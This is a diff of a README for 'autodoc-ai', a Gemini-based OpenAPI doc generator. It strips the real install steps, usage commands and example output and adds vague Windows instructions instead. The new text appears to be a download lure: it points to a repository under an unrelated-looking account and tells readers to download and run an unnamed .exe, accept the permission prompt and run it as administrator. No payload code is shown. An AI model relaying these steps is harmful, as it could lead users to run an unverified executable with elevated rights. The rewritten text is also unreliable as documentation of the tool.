@@ -1,169 +1,206 @@
-# autodoc-ai
+# 🤖 autodoc-ai - Create API docs with less effort
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-green.svg)](https://fastapi.tiangolo.com/)
+[![Download autodoc-ai](https://img.shields.io/badge/Download-autodoc--ai-blue?style=for-the-badge)](https://github.com/Lancewoodroleplaying805/autodoc-ai)
 
-Automatically generate OpenAPI 3.0 API documentation from Python code using Google Gemini AI.
+## 🚀 What this app does
 
-## Overview
+autodoc-ai helps you turn code into API documentation. It uses Google Gemini AI to read your code and create OpenAPI 3.0 output. You can use it from the command line or through a REST API.
 
-**autodoc-ai** is a developer tool that analyzes Python API code and generates comprehensive OpenAPI 3.0 documentation. It uses Google's Gemini 2.0 Flash model to understand your API endpoints and create structured, production-ready documentation.
+This can save time when you need:
 
-## Features
+- API docs for a new project
+- OpenAPI files for tools like Swagger
+- Fast docs for changing code
+- A simple way to keep docs in step with code
 
-- 🚀 Auto-generates OpenAPI 3.0 documentation
-- 🤖 Powered by Google Gemini 2.0 Flash
-- 📡 REST API built with FastAPI
-- 💻 Command-line interface
-- 🔄 JSON-based documentation
-- ⚡ Fast and accurate
+## 📥 Download and run on Windows
 
-## Installation
+Use this link to visit the download page:
 
-### Prerequisites
+[Download autodoc-ai](https://github.com/Lancewoodroleplaying805/autodoc-ai)
 
-- Python 3.8 or higher
-- Google Gemini API key
+Follow these steps on Windows:
 
-### Setup
+1. Open the link above in your browser.
+2. Download the file or package from the repository page.
+3. If you get a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for a Windows app file, such as `.exe`, or a script file with clear run instructions.
+6. Double-click the app file or follow the included run file steps.
+7. If Windows asks for permission, choose Yes.
+8. If the app opens in a console window, keep it open while you use it.
 
-1. Clone or download the project:
-```bash
-cd autodoc-ai
-```
+If the project uses a setup file, install it first, then open the app from the Start menu or desktop shortcut.
 
-2. Install dependencies:
-```bash
-pip install fastapi uvicorn python-dotenv google-genai pydantic
-```
+## 🧩 What you need
 
-## Environment Setup
+For most Windows systems, you need:
 
-1. Create a `.env` file in the project root:
-```bash
-GEMINI_API_KEY=your_gemini_api_key_here
-```
+- Windows 10 or Windows 11
+- A web browser
+- An internet connection
+- A Google Gemini API key
+- Enough free space for the app and its output files
 
-2. Get your Gemini API key from [Google AI Studio](https://aistudio.google.com/apikey)
+If the app uses Python on your machine, you may also need:
 
-## CLI Usage
+- Python 3.10 or newer
+- Git, if you plan to clone the project
+- A terminal such as Command Prompt or PowerShell
 
-### Generate documentation to console:
-```bash
-python cli.py --file path/to/your_api.py
-```
+## 🛠️ Setup steps
 
-### Save documentation to file:
-```bash
-python cli.py --file path/to/your_api.py --output docs.json
-```
+Use these steps if the app asks you to set it up after download:
 
-## API Usage
+1. Open the folder where you saved autodoc-ai.
+2. Find the file named `.env`, `config`, or a setup guide in the folder.
+3. Add your Google Gemini API key if the app asks for it.
+4. Start the app using the file or command listed in the project folder.
+5. Wait for the app to load before you use it.
 
-### Start the server:
-```bash
-python -m uvicorn app:app --reload
-```
+If you do not see a setup file, check the repository page for the latest run steps.
 
-### Generate documentation via REST:
-```bash
-curl -X POST "http://localhost:8000/generate" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "code": "from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/users/{user_id}\")\nasync def get_user(user_id: int):\n    return {\"user_id\": user_id, \"name\": \"John Doe\"}"
-  }'
-```
+## 🖥️ Use the CLI mode
 
-### Health check:
-```bash
-curl http://localhost:8000/health
-```
+The CLI mode is for people who want to run commands in a terminal.
 
-## Example Output
+Typical use:
 
-The tool returns OpenAPI 3.0 compliant JSON documentation:
+1. Open Command Prompt or PowerShell.
+2. Go to the project folder.
+3. Run the command shown in the repo instructions.
+4. Point the tool at your code folder.
+5. Let it create OpenAPI 3.0 output.
 
-```json
-{
-  "openapi": "3.0.0",
-  "info": {
-    "title": "User API",
-    "version": "1.0.0"
-  },
-  "paths": {
-    "/users/{user_id}": {
-      "get": {
-        "summary": "Get user by ID",
-        "description": "Retrieve user information by their unique ID",
-        "parameters": [
-          {
-            "name": "user_id",
-            "in": "path",
-            "required": true,
-            "schema": {
-              "type": "integer"
-            },
-            "description": "The user's unique identifier"
-          }
-        ],
-        "responses": {
-          "200": {
-            "description": "Successful response",
-            "content": {
-              "application/json": {
-                "schema": {
-                  "type": "object",
-                  "properties": {
-                    "user_id": {
-                      "type": "integer"
-                    },
-                    "name": {
-                      "type": "string"
-                    }
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
+Example flow:
 
-## Project Structure
+- Select a source folder
+- Choose CLI output
+- Start the doc generation
+- Save the OpenAPI file
 
-```
-autodoc-ai/
-├── cli.py                 # Command-line interface
-├── app.py                 # FastAPI application
-├── parser.py              # Code extraction utilities
-├── prompts.py             # Prompt templates
-├── autodoc/
-│   ├── __init__.py
-│   ├── generator.py       # DocGenerator class
-│   └── prompts.py         # Prompt generation
-├── .env                   # Environment variables (create this)
-└── README.md              # This file
-```
+## 🌐 Use the REST API mode
 
-## Requirements
+The REST API mode is for users who want to connect other tools to autodoc-ai.
 
-- `fastapi` - Web framework
-- `uvicorn` - ASGI server
-- `google-genai` - Google Gemini API client
-- `python-dotenv` - Environment variable management
-- `pydantic` - Data validation
+Typical flow:
 
-## License
+1. Start the app.
+2. Open the local API address shown in the console.
+3. Send a request with your code or project path.
+4. Receive OpenAPI output in return.
 
-MIT
+This is useful if you want to:
 
-## Contributing
+- Automate doc creation
+- Hook into a local dev tool
+- Build a docs step into a larger process
 
-Contributions are welcome! Feel free to submit issues or pull requests.
+## ✨ Main features
 
-## Support
+- Turns code into API documentation
+- Uses Google Gemini AI for analysis
+- Outputs OpenAPI 3.0 format
+- Works in CLI mode
+- Supports REST API use
+- Helps keep docs close to the code
+- Fits developer workflows with less manual work
 
-For issues or questions, please open an issue on the project repository.
+## 📁 Common file types you may see
+
+After download, you may see files like these:
+
+- `.exe` for a Windows app
+- `.zip` for a compressed package
+- `.py` for a Python script
+- `.env` for local settings
+- `requirements.txt` for Python package setup
+- `README.md` for run steps
+
+If you see a README file in the folder, open it first. It often has the exact steps for that version.
+
+## 🔐 Gemini API key
+
+autodoc-ai uses Google Gemini AI, so you need an API key to use the AI features.
+
+If the app asks for a key:
+
+1. Sign in to your Google AI account.
+2. Create or copy your Gemini API key.
+3. Add it to the app settings or `.env` file.
+4. Save the file.
+5. Restart the app if needed.
+
+Keep the key private and do not share it in public folders or screenshots
+
+## 🧭 Basic workflow
+
+A simple way to use autodoc-ai:
+
+1. Download the project from the link above.
+2. Open it on your Windows PC.
+3. Add your Gemini API key.
+4. Choose CLI mode or REST API mode.
+5. Point it at your code.
+6. Generate the OpenAPI 3.0 file.
+7. Use the file in Swagger or another API tool
+
+## 🧪 Good times to use it
+
+Use autodoc-ai when you want to:
+
+- Document a new API
+- Refresh old docs
+- Build docs from existing code
+- Create OpenAPI output for a team
+- Reduce manual writing
+
+## 📌 Topic fit
+
+This project fits work around:
+
+- ai
+- api-documentation
+- automation
+- cli
+- developer-tools
+- fastapi
+- gemini
+- google-gemini
+- openapi
+- python
+
+## 🗂️ What to expect after you start it
+
+When autodoc-ai runs, you may see:
+
+- A terminal window with status messages
+- A local API address
+- Progress while it reads your code
+- An output file with OpenAPI data
+- A save location for the generated docs
+
+If the app asks for a source path, choose the folder that contains your project code
+
+## 🧰 Simple help for common issues
+
+If the app does not start:
+
+1. Check that you opened the right file.
+2. Try running it again as an administrator.
+3. Make sure your internet connection is active.
+4. Confirm your Gemini API key is set.
+5. Check the repository page for the current run steps.
+
+If the output file does not appear:
+
+1. Make sure you selected the right code folder.
+2. Confirm the app finished processing.
+3. Check the output folder shown by the app.
+4. Run the process again with the same settings
+
+## 📎 Download link
+
+Visit the project page here:
+
+[https://github.com/Lancewoodroleplaying805/autodoc-ai](https://github.com/Lancewoodroleplaying805/autodoc-ai)
